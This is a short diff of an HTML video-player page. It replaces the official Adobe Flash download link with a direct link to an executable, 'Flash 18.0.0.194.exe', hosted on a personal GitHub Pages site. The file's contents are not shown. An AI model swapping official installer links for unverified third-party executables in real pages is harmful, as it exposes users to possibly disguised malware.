@@ -495,7 +495,7 @@ if (self !== top) {
 <meta name="medium" content="video"/>
 <div style="position:relative">
     <div id="playerdiv" align="center" style="width:620px;height:349px;">
-        This content requires the Adobe Flash Player 10.3. <a href="https://get.adobe.com/flashplayer/">Get Flash</a>
+        This content requires the Adobe Flash Player 18.0 <a href="https://josephcrosmanplays532.github.io/go/getflash/Flash%2018.0.0.194.exe">Get Flash</a>
     </div>
     </div>
 <script type="text/javascript">
